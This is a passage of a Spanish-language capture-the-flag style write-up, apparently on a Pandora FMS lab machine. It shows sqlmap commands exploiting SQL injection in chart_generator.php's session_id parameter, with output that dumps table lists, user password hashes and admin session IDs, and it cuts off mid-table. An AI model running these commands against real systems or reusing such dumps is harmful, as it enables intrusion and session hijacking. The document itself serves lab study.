class="hljs-string">+---------------------------------------+</span><br><span class="hljs-string">| ALL_PLUGINS                           |</span><br><span class="hljs-string">| APPLICABLE_ROLES                      |</span><br><span class="hljs-string">| CHARACTER_SETS                        |</span><br><span class="hljs-string">| CHECK_CONSTRAINTS                     |</span><br><span class="hljs-string">| CLIENT_STATISTICS                     |</span><br><span class="hljs-string">| COLLATIONS                            |</span><br><span class="hljs-string">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="hljs-string">| COLUMNS                               |</span><br><span class="hljs-string">| COLUMN_PRIVILEGES                     |</span><br><span class="hljs-string">| ENABLED_ROLES                         |</span><br><span class="hljs-string">| ENGINES                               |</span><br><span class="hljs-string">| EVENTS                                |</span><br><span class="hljs-string">| FILES                                 |</span><br><span class="hljs-string">| GEOMETRY_COLUMNS                      |</span><br><span class="hljs-string">| GLOBAL_STATUS                         |</span><br><span class="hljs-string">| GLOBAL_VARIABLES                      |</span><br><span class="hljs-string">| INDEX_STATISTICS                      |</span><br><span class="hljs-string">| INNODB_BUFFER_PAGE                    |</span><br><span class="hljs-string">| INNODB_BUFFER_PAGE_LRU                |</span><br><span class="hljs-string">| INNODB_BUFFER_POOL_STATS              |</span><br><span class="hljs-string">| INNODB_CMP                            |</span><br><span class="hljs-string">| INNODB_CMPMEM                         |</span><br><span class="hljs-string">| INNODB_CMPMEM_RESET                   |</span><br><span class="hljs-string">| INNODB_CMP_PER_INDEX                  |</span><br><span class="hljs-string">| INNODB_CMP_PER_INDEX_RESET            |</span><br><span class="hljs-string">| INNODB_CMP_RESET                      |</span><br><span class="hljs-string">| INNODB_FT_BEING_DELETED               |</span><br><span class="hljs-string">| INNODB_FT_CONFIG                      |</span><br><span class="hljs-string">| INNODB_FT_DEFAULT_STOPWORD            |</span><br><span class="hljs-string">| INNODB_FT_DELETED                     |</span><br><span class="hljs-string">| INNODB_FT_INDEX_CACHE                 |</span><br><span class="hljs-string">| INNODB_FT_INDEX_TABLE                 |</span><br><span class="hljs-string">| INNODB_LOCKS                          |</span><br><span class="hljs-string">| INNODB_LOCK_WAITS                     |</span><br><span class="hljs-string">| INNODB_METRICS                        |</span><br><span class="hljs-string">| INNODB_MUTEXES                        |</span><br><span class="hljs-string">| INNODB_SYS_COLUMNS                    |</span><br><span class="hljs-string">| INNODB_SYS_DATAFILES                  |</span><br><span class="hljs-string">| INNODB_SYS_FIELDS                     |</span><br><span class="hljs-string">| INNODB_SYS_FOREIGN                    |</span><br><span class="hljs-string">| INNODB_SYS_FOREIGN_COLS               |</span><br><span class="hljs-string">| INNODB_SYS_INDEXES                    |</span><br><span class="hljs-string">| INNODB_SYS_SEMAPHORE_WAITS            |</span><br><span class="hljs-string">| INNODB_SYS_TABLES                     |</span><br><span class="hljs-string">| INNODB_SYS_TABLESPACES                |</span><br><span class="hljs-string">| INNODB_SYS_TABLESTATS                 |</span><br><span class="hljs-string">| INNODB_SYS_VIRTUAL                    |</span><br><span class="hljs-string">| INNODB_TABLESPACES_ENCRYPTION         |</span><br><span class="hljs-string">| INNODB_TABLESPACES_SCRUBBING          |</span><br><span class="hljs-string">| INNODB_TRX                            |</span><br><span class="hljs-string">| KEYWORDS                              |</span><br><span class="hljs-string">| KEY_CACHES                            |</span><br><span class="hljs-string">| KEY_COLUMN_USAGE                      |</span><br><span class="hljs-string">| PARAMETERS                            |</span><br><span class="hljs-string">| PARTITIONS                            |</span><br><span class="hljs-string">| PLUGINS                               |</span><br><span class="hljs-string">| PROCESSLIST                           |</span><br><span class="hljs-string">| PROFILING                             |</span><br><span class="hljs-string">| REFERENTIAL_CONSTRAINTS               |</span><br><span class="hljs-string">| ROUTINES                              |</span><br><span class="hljs-string">| SCHEMATA                              |</span><br><span class="hljs-string">| SCHEMA_PRIVILEGES                     |</span><br><span class="hljs-string">| SESSION_STATUS                        |</span><br><span class="hljs-string">| SESSION_VARIABLES                     |</span><br><span class="hljs-string">| SPATIAL_REF_SYS                       |</span><br><span class="hljs-string">| SQL_FUNCTIONS                         |</span><br><span class="hljs-string">| STATISTICS                            |</span><br><span class="hljs-string">| SYSTEM_VARIABLES                      |</span><br><span class="hljs-string">| TABLES                                |</span><br><span class="hljs-string">| TABLESPACES                           |</span><br><span class="hljs-string">| TABLE_CONSTRAINTS                     |</span><br><span class="hljs-string">| TABLE_PRIVILEGES                      |</span><br><span class="hljs-string">| TABLE_STATISTICS                      |</span><br><span class="hljs-string">| TRIGGERS                              |</span><br><span class="hljs-string">| USER_PRIVILEGES                       |</span><br><span class="hljs-string">| USER_STATISTICS                       |</span><br><span class="hljs-string">| VIEWS                                 |</span><br><span class="hljs-string">| user_variables                        |</span><br><span class="hljs-string">+---------------------------------------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">Database: pandora</span><br><span class="hljs-string">[178 tables]</span><br><span class="hljs-string">+---------------------------------------+</span><br><span class="hljs-string">| taddress                              |</span><br><span class="hljs-string">| taddress_agent                        |</span><br><span class="hljs-string">| tagent_access                         |</span><br><span class="hljs-string">| tagent_custom_data                    |</span><br><span class="hljs-string">| tagent_custom_fields                  |</span><br><span class="hljs-string">| tagent_custom_fields_filter           |</span><br><span class="hljs-string">| tagent_module_inventory               |</span><br><span class="hljs-string">| tagent_module_log                     |</span><br><span class="hljs-string">| tagent_repository                     |</span><br><span class="hljs-string">| tagent_secondary_group                |</span><br><span class="hljs-string">| tagente                               |</span><br><span class="hljs-string">| tagente_datos                         |</span><br><span class="hljs-string">| tagente_datos_inc                     |</span><br><span class="hljs-string">| tagente_datos_inventory               |</span><br><span class="hljs-string">| tagente_datos_log4x                   |</span><br><span class="hljs-string">| tagente_datos_string                  |</span><br><span class="hljs-string">| tagente_estado                        |</span><br><span class="hljs-string">| tagente_modulo                        |</span><br><span class="hljs-string">| talert_actions                        |</span><br><span class="hljs-string">| talert_commands                       |</span><br><span class="hljs-string">| talert_snmp                           |</span><br><span class="hljs-string">| talert_snmp_action                    |</span><br><span class="hljs-string">| talert_special_days                   |</span><br><span class="hljs-string">| talert_template_module_actions        |</span><br><span class="hljs-string">| talert_template_modules               |</span><br><span class="hljs-string">| talert_templates                      |</span><br><span class="hljs-string">| tattachment                           |</span><br><span class="hljs-string">| tautoconfig                           |</span><br><span class="hljs-string">| tautoconfig_actions                   |</span><br><span class="hljs-string">| tautoconfig_rules                     |</span><br><span class="hljs-string">| tcategory                             |</span><br><span class="hljs-string">| tcluster                              |</span><br><span class="hljs-string">| tcluster_agent                        |</span><br><span class="hljs-string">| tcluster_item                         |</span><br><span class="hljs-string">| tcollection                           |</span><br><span class="hljs-string">| tconfig                               |</span><br><span class="hljs-string">| tconfig_os                            |</span><br><span class="hljs-string">| tcontainer                            |</span><br><span class="hljs-string">| tcontainer_item                       |</span><br><span class="hljs-string">| tcredential_store                     |</span><br><span class="hljs-string">| tdashboard                            |</span><br><span class="hljs-string">| tdatabase                             |</span><br><span class="hljs-string">| tdeployment_hosts                     |</span><br><span class="hljs-string">| tevent_alert                          |</span><br><span class="hljs-string">| tevent_alert_action                   |</span><br><span class="hljs-string">| tevent_custom_field                   |</span><br><span class="hljs-string">| tevent_extended                       |</span><br><span class="hljs-string">| tevent_filter                         |</span><br><span class="hljs-string">| tevent_response                       |</span><br><span class="hljs-string">| tevent_rule                           |</span><br><span class="hljs-string">| tevento                               |</span><br><span class="hljs-string">| textension_translate_string           |</span><br><span class="hljs-string">| tfiles_repo                           |</span><br><span class="hljs-string">| tfiles_repo_group                     |</span><br><span class="hljs-string">| tgis_data_history                     |</span><br><span class="hljs-string">| tgis_data_status                      |</span><br><span class="hljs-string">| tgis_map                              |</span><br><span class="hljs-string">| tgis_map_connection                   |</span><br><span class="hljs-string">| tgis_map_has_tgis_map_con             |</span><br><span class="hljs-string">| tgis_map_layer                        |</span><br><span class="hljs-string">| tgis_map_layer_groups                 |</span><br><span class="hljs-string">| tgis_map_layer_has_tagente            |</span><br><span class="hljs-string">| tgraph                                |</span><br><span class="hljs-string">| tgraph_source                         |</span><br><span class="hljs-string">| tgraph_source_template                |</span><br><span class="hljs-string">| tgraph_template                       |</span><br><span class="hljs-string">| tgroup_stat                           |</span><br><span class="hljs-string">| tgrupo                                |</span><br><span class="hljs-string">| tincidencia                           |</span><br><span class="hljs-string">| titem                                 |</span><br><span class="hljs-string">| tlanguage                             |</span><br><span class="hljs-string">| tlayout                               |</span><br><span class="hljs-string">| tlayout_data                          |</span><br><span class="hljs-string">| tlayout_template                      |</span><br><span class="hljs-string">| tlayout_template_data                 |</span><br><span class="hljs-string">| tlink                                 |</span><br><span class="hljs-string">| tlocal_component                      |</span><br><span class="hljs-string">| tlog_graph_models                     |</span><br><span class="hljs-string">| tmap                                  |</span><br><span class="hljs-string">| tmensajes                             |</span><br><span class="hljs-string">| tmetaconsole_agent                    |</span><br><span class="hljs-string">| tmetaconsole_agent_secondary_group    |</span><br><span class="hljs-string">| tmetaconsole_event                    |</span><br><span class="hljs-string">| tmetaconsole_event_history            |</span><br><span class="hljs-string">| tmetaconsole_setup                    |</span><br><span class="hljs-string">| tmigration_module_queue               |</span><br><span class="hljs-string">| tmigration_queue                      |</span><br><span class="hljs-string">| tmodule                               |</span><br><span class="hljs-string">| tmodule_group                         |</span><br><span class="hljs-string">| tmodule_inventory                     |</span><br><span class="hljs-string">| tmodule_relationship                  |</span><br><span class="hljs-string">| tmodule_synth                         |</span><br><span class="hljs-string">| tnetflow_filter                       |</span><br><span class="hljs-string">| tnetflow_report                       |</span><br><span class="hljs-string">| tnetflow_report_content               |</span><br><span class="hljs-string">| tnetwork_component                    |</span><br><span class="hljs-string">| tnetwork_component_group              |</span><br><span class="hljs-string">| tnetwork_map                          |</span><br><span class="hljs-string">| tnetwork_matrix                       |</span><br><span class="hljs-string">| tnetwork_profile                      |</span><br><span class="hljs-string">| tnetwork_profile_component            |</span><br><span class="hljs-string">| tnetworkmap_ent_rel_nodes             |</span><br><span class="hljs-string">| tnetworkmap_enterprise                |</span><br><span class="hljs-string">| tnetworkmap_enterprise_nodes          |</span><br><span class="hljs-string">| tnews                                 |</span><br><span class="hljs-string">| tnota                                 |</span><br><span class="hljs-string">| tnotification_group                   |</span><br><span class="hljs-string">| tnotification_source                  |</span><br><span class="hljs-string">| tnotification_source_group            |</span><br><span class="hljs-string">| tnotification_source_group_user       |</span><br><span class="hljs-string">| tnotification_source_user             |</span><br><span class="hljs-string">| tnotification_user                    |</span><br><span class="hljs-string">| torigen                               |</span><br><span class="hljs-string">| tpassword_history                     |</span><br><span class="hljs-string">| tperfil                               |</span><br><span class="hljs-string">| tphase                                |</span><br><span class="hljs-string">| tplanned_downtime                     |</span><br><span class="hljs-string">| tplanned_downtime_agents              |</span><br><span class="hljs-string">| tplanned_downtime_modules             |</span><br><span class="hljs-string">| tplugin                               |</span><br><span class="hljs-string">| tpolicies                             |</span><br><span class="hljs-string">| tpolicy_agents                        |</span><br><span class="hljs-string">| tpolicy_alerts                        |</span><br><span class="hljs-string">| tpolicy_alerts_actions                |</span><br><span class="hljs-string">| tpolicy_collections                   |</span><br><span class="hljs-string">| tpolicy_groups                        |</span><br><span class="hljs-string">| tpolicy_modules                       |</span><br><span class="hljs-string">| tpolicy_modules_inventory             |</span><br><span class="hljs-string">| tpolicy_plugins                       |</span><br><span class="hljs-string">| tpolicy_queue                         |</span><br><span class="hljs-string">| tprofile_view                         |</span><br><span class="hljs-string">| tprovisioning                         |</span><br><span class="hljs-string">| tprovisioning_rules                   |</span><br><span class="hljs-string">| trecon_script                         |</span><br><span class="hljs-string">| trecon_task                           |</span><br><span class="hljs-string">| trel_item                             |</span><br><span class="hljs-string">| tremote_command                       |</span><br><span class="hljs-string">| tremote_command_target                |</span><br><span class="hljs-string">| treport                               |</span><br><span class="hljs-string">| treport_content                       |</span><br><span class="hljs-string">| treport_content_item                  |</span><br><span class="hljs-string">| treport_content_item_temp             |</span><br><span class="hljs-string">| treport_content_sla_com_temp          |</span><br><span class="hljs-string">| treport_content_sla_combined          |</span><br><span class="hljs-string">| treport_content_template              |</span><br><span class="hljs-string">| treport_custom_sql                    |</span><br><span class="hljs-string">| treport_template                      |</span><br><span class="hljs-string">| treset_pass                           |</span><br><span class="hljs-string">| treset_pass_history                   |</span><br><span class="hljs-string">| tserver                               |</span><br><span class="hljs-string">| tserver_export                        |</span><br><span class="hljs-string">| tserver_export_data                   |</span><br><span class="hljs-string">| tservice                              |</span><br><span class="hljs-string">| tservice_element                      |</span><br><span class="hljs-string">| tsesion                               |</span><br><span class="hljs-string">| tsesion_extended                      |</span><br><span class="hljs-string">| tsessions_php                         |</span><br><span class="hljs-string">| tskin                                 |</span><br><span class="hljs-string">| tsnmp_filter                          |</span><br><span class="hljs-string">| ttag                                  |</span><br><span class="hljs-string">| ttag_module                           |</span><br><span class="hljs-string">| ttag_policy_module                    |</span><br><span class="hljs-string">| ttipo_modulo                          |</span><br><span class="hljs-string">| ttransaction                          |</span><br><span class="hljs-string">| ttrap                                 |</span><br><span class="hljs-string">| ttrap_custom_values                   |</span><br><span class="hljs-string">| tupdate                               |</span><br><span class="hljs-string">| tupdate_journal                       |</span><br><span class="hljs-string">| tupdate_package                       |</span><br><span class="hljs-string">| tupdate_settings                      |</span><br><span class="hljs-string">| tuser_double_auth                     |</span><br><span class="hljs-string">| tuser_task                            |</span><br><span class="hljs-string">| tuser_task_scheduled                  |</span><br><span class="hljs-string">| tusuario                              |</span><br><span class="hljs-string">| tusuario_perfil                       |</span><br><span class="hljs-string">| tvisual_console_elements_cache        |</span><br><span class="hljs-string">| twidget                               |</span><br><span class="hljs-string">| twidget_dashboard                     |</span><br><span class="hljs-string">+---------------------------------------+</span><br></code></pre></td></tr></table></figure><p>Una vez obtenidas las tablas, me resultaron interesante sobretodo 2 tablas:</p><ul><li>tusuario</li><li>tsessions_php</li></ul><p><strong>tusuario</strong><br>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://127.0.0.1:1234/pandora_console/include/chart_generator.php?session_id=1 --batch -T tusuario -C fullname,password -dump<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">+---------------+----------------------------------+<br>| fullname      | password                         |<br>+---------------+----------------------------------+<br>| Daniel        | 76323c174bd49ffbbdedf678f6cc89a6 |<br>| Matt          | f655f807365b6dc602b31ab3d6d43acc |<br>| Pandora Admin | ad3f741b04bd5880fb32b54bc4f43d6a |<br>+---------------+----------------------------------+<br></code></pre></td></tr></table></figure><p>Si los hashes huvieran sido crackeados en el proceso, se verían los hashes junto la contraseña en claro.</p><p><strong>tsessions_php</strong><br>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://127.0.0.1:1234/pandora_console/include/chart_generator.php?session_id=1 --batch -T tsession_php -dump<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs bash">+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+<br>| id_session                 | data                                                                                                   | last_active |<br>+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+<br>| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638783555  |<br>| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                                                                   | 1638789018  |<br>| 10dlmt14mqkqudorrq9aj84s5f | NULL                                                                                                   | 1652804203  |<br>| 11b3ll8php0s6nenjfckhp1pqr | NULL                                                                                                   | 1652784108  |<br>| 1641l13o2ju3tbitlmqb090oke | NULL                                                                                                   | 1652778742  |<br>| 19h5nsgimmcno42t6c2s9vl38s | NULL                                                                                                   | 1652777047  |<br>| 1um23if7s531kqf5da14kf5lvm | NULL                                                                                                   | 1638792211  |<br>| 202pii5gvhmih06fl8qtu4s3ii | NULL                                                                                                   | 1652804309  |<br>| 25ov4tvq6p64dr0fslvpn5v7cm | alert_msg|a:0:&#123;&#125;new_chat|b:0;id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;csrf_code|s:32:<span class="hljs-string">&quot;118f0f7d536712635b6fe1fa09e483c2&quot;</span>; | 1652793886  |<br>| 2alt0joh5j2b626ivnr4b146fi | NULL                                                                                                   | 1652781830  |<br>| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                                                                   | 1638786129  |<br>| 2ej62t4oirpkglfk1s0jhqagns | NULL                                                                                                   | 1652781976  |<br>| 2pqi0jd0u1b87i1fb727hc5keu | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652781467  |<br>| 2s1q4c7vc0g7t3t2oc63cnkn1e | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652795330  |<br>| 2smfl0fk10av7q0o18vofeolb3 | NULL                                                                                                   | 1652802091  |<br>| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638540332  |<br>| 38tb6as05dg7rtfqm2kbe3s28a | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652782853  |<br>| 3me2jjab4atfa5f8106iklh4fc | NULL                                                                                                   | 1638795380  |<br>| 3mjnu86etd3ot71ob8cugl293m | NULL                                                                                                   | 1652776756  |<br>| 3mp7098p02qua5098388c6veje | alert_msg|a:0:&#123;&#125;new_chat|b:0;id_usuario|s:4:<span class="hljs-string">&quot;matt&quot;</span>;csrf_code|s:32:<span class="hljs-string">&quot;e1fd9c7bf5af6d6e61d98a18b3c5f0fa&quot;</span>;  | 1652794491  |<br>| 3sghjvhvbs157v8e38j9gr0fio | NULL                                                                                                   | 1652803611  |<br>| 47qrojlmo3guc9hd8q4ra2ujje | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652788631  |<br>| 48es2fqcv4r8ppjcpu9kbdqq6u | NULL                                                                                                   | 1652779487  |<br>| 4f51mju7kcuonuqor3876n8o02 | NULL                                                                                                   | 1638786842  |<br>| 4jd00h0kflf3ip9oq1v07uj68h | NULL                                                                                                   | 1652803576  |<br>| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638535373  |<br>| 4rddo62bhlu1u2bmrl32i38j15 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652792554  |<br>| 59qae699l0971h13qmbpqahlls | NULL                                                                                                   | 1638787305  |<br>| 5alm7l78k82718m0ikcvu6qhqu | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652794721  |<br>| 5aocb16lf5nfantbogadd2q3aa | NULL                                                                                                   | 1652785183  |<br>| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                                                                   | 1638792685  |<br>| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638281946  |<br>| 5lanv60io4esrsp8cdfi07l87q | NULL                                                                                                   | 1652777928  |<br>| 5t29n6g6rcos8dbar08i4j1a4e | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652790850  |<br>| 63905fsm7u63gedljhmcfichgc | NULL                                                                                                   | 1652789183  |<br>| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1641195617  |<br>| 6r12tgi2bgj27lkrmhdsalv2om | NULL                                                                                                   | 1652783570  |<br>| 73oehv9v8t1ujbapotbncfdfcu | NULL                                                                                                   | 1652785603  |<br>| 7cqd2ii7dgo7i6gel7mr5j83u5 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652803099  |<br>| 7gl6hu132khm86ctvkc5v7t261 | NULL                                                                                                   | 1652778360  |<br>| 7k9mqq52l03fqrc6bac1h96u1h | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652802382  |<br>| 7o7k1jkuncsqjcqdpf31do41ic | NULL                                                                                                   | 1652781756  |<br>| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                                                                   | 1623957150  |<br>| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638446321  |<br>| 8rtdlmkijlt9efshtdo2o9efp7 | NULL                                                                                                   | 1652783170  |<br>| 8upeameujo9nhki3ps0fu32cgd | NULL                                                                                                   | 1638787267  |<br>| 97k979r6re29lscfkd4vh465jm | NULL                                                                                                   | 1652781334  |<br>| 9skub9p65v740rsk9n1r2qa3mu | NULL                                                                                                   | 1652779566  |<br>| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638881787  |<br>| a3a49kc938u7od6e6mlip1ej80 | NULL                                                                                                   | 1638795315  |<br>| a808nqm34l7gkj4brt7sfoava3 | NULL                                                                                                   | 1652803447  |<br>| a9nut753sug8mhfdt4k1bh8nm1 | NULL                                                                                                   | 1652784088  |<br>| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638881664  |<br>| ajli44un9mfsec9gleg4r4h1eh | NULL                                                                                                   | 1652803477  |<br>| amv8cg12klpcdr8onj07fgr6g7 | NULL                                                                                                   | 1652783633  |<br>| bknl23r5e00fnq307qu5l6v815 | NULL                                                                                                   | 1652771506  |<br>| c33nl3na9cjl0j2935o1s4c8q1 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652763442  |<br>| c3t08pbjctb9e3i8lru0035utq | NULL                                                                                                   | 1652783914  |<br>| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                                                                   | 1638787213  |<br>| cponsqk4jctp23dvlhivg0u57t | NULL                                                                                                   | 1652804117  |<br>| d0carbrks2lvmb90ergj7jv6po | NULL                                                                                                   | 1638786277  |<br>| d3c1nhmkgrhet7bui5pgf6mjsr | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652791062  |<br>| d4e4od5fktv35si1i6b9nbioue | NULL                                                                                                   | 1652782498  |<br>| d659sm9ns85vs0bafji2pjqnjh | NULL                                                                                                   | 1652777822  |<br>| da1gab3439390876f3gl7ena01 | NULL                                                                                                   | 1652781910  |<br>| dr4549r5h5nrna9ogndiq0o5i0 | NULL                                                                                                   | 1652780733  |<br>| dv0j7e5uo997r19kh9mh0buiot | NULL                                                                                                   | 1652781531  |<br>| e7dnb4cdef8tb5l3t1h4i7q1ne | NULL                                                                                                   | 1652789133  |<br>| e8tbi07f6qo72993und4srq564 | NULL                                                                                                   | 1652805785  |<br>| earfjkg4kfmssrp5j4bjus4np4 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652790426  |<br>| eco06sq8eum0lmkp4fe561a8up | NULL                                                                                                   | 1652789372  |<br>| emu5hboeqnt8hk0urskpfj619u | NULL                                                                                                   | 1652804070  |<br>| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1641200284  |<br>| f150uh33m894bi643frg4cuffv | NULL                                                                                                   | 1652805812  |<br>| f5r954dgjek4ukka5nr3hrh19g | NULL                                                                                                   | 1652780763  |<br>| f7vaqdbfi9p1mqk82nck5d0cd5 | NULL                                                                                                   | 1652788673  |<br>| fa3nuknk77j34snuhm6sg609u4 | NULL                                                                                                   | 1652785040  |<br>| fikt9p6i78no7aofn74rr71m85 | NULL                                                                                                   | 1638786504  |<br>| fqd96rcv4ecuqs409n5qsleufi | NULL                                                                                                   | 1638786762  |<br>| frg0vq490p4uavglk70mkjk9ud | NULL                                                                                                   | 1652778136  |<br>| fvrbnm6hj1od79cq05fqlouer7 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652795061  |<br>| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638783230  |<br>| g0vcd1of2oa4tmnk3qofeo3121 | NULL                                                                                                   | 1652805877  |<br>| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:<span class="hljs-string">&quot;matt&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                    | 1638796349  |<br>| g8akafk9a1tjtdseorhm21uj3q | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652790365  |<br>| gddc24r8psladbpt8fa0dfa9ol | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652790581  |<br>| gf40pukfdinc63nm5lkroidde6 | NULL                                                                                                   | 1638786349  |<br>| gkd4f0clg44m1tkrfjqkn9aiun | NULL                                                                                                   | 1652785253  |<br>| gon74ua9f9qnng7u40vci2bp2g | NULL                                                                                                   | 1652805860  |<br>| gvhme9ed31srg9ku4palh8u77f | NULL                                                                                                   | 1652803149  |<br>| 